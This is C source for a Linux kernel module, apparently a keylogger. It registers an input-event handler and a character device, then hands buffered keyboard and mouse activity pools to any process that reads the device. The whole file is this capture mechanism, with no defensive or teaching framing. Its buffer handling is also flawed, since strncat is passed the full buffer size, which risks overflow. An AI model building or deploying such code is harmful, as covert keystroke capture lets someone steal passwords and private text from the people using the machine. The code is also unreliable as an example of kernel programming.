#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <asm/uaccess.h>

#include "evb.h"
MODULE_LICENSE("GPL");
#define DEVICE_NAME "lkm_example"
#define MSG_BUFFER_LEN 4096


static int device_open(struct inode *, struct file *);
static int device_release(struct inode *, struct file *);
static ssize_t device_read(struct file *, char *, size_t, loff_t *);
static ssize_t device_write(struct file *, const char *, size_t, loff_t *);
static int major_num;
static int device_open_count = 0;
static char msg_buffer[MSG_BUFFER_LEN];
static char *msg_ptr;
bool isread = false;

static struct file_operations file_ops = {
 .read = device_read,
 .write = device_write,
 .open = device_open,
 .release = device_release
};

static ssize_t device_read(struct file *flip, char *buffer, size_t len, loff_t *offset) {
 int bytes_read = 0;
if(!isread){

strncat(msg_buffer, "----KEYBOARD POOL----\n", MSG_BUFFER_LEN);
strncat(msg_buffer, keyboard_pool, MSG_BUFFER_LEN);


strncat(msg_buffer, "----MOUSE MOVEMENTS POOL----\n", MSG_BUFFER_LEN);
strncat(msg_buffer, mouse_pool, MSG_BUFFER_LEN);

strncat(msg_buffer, "----MOUSE PRESSES POOL----\n", MSG_BUFFER_LEN);
strncat(msg_buffer, mousemov_pool, MSG_BUFFER_LEN);


strncat(msg_buffer, "----MOUSE SCROLLS POOL----\n", MSG_BUFFER_LEN);
strncat(msg_buffer, mousescr_pool, MSG_BUFFER_LEN);

}
 while (len && *msg_ptr) {

 if (*msg_ptr == 0) {
 msg_ptr = msg_buffer;
 }

 put_user(*(msg_ptr++), buffer++);
 len--;
 bytes_read++;
 }
isread = true;
 return bytes_read;
}

static ssize_t device_write(struct file *flip, const char *buffer, size_t len, loff_t *offset) {
 return -EINVAL;
}

static int device_open(struct inode *inode, struct file *file) {
 if (device_open_count) {
 return -EBUSY;
 }
 device_open_count++;
 try_module_get(THIS_MODULE);
 return 0;
}

static int device_release(struct inode *inode, struct file *file) {
 device_open_count--;
 module_put(THIS_MODULE);
 return 0;
}

static int __init lkm_example_init(void) {
 msg_ptr = msg_buffer;
 major_num = register_chrdev(0, "lkm_example", &file_ops);
 if (major_num < 0) {
 return major_num;
 } else {
 //return 0;
	return input_register_handler(&evbug_handler);
 }
}
static void __exit lkm_example_exit(void) {

input_unregister_handler(&evbug_handler);
 unregister_chrdev(major_num, DEVICE_NAME);

}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
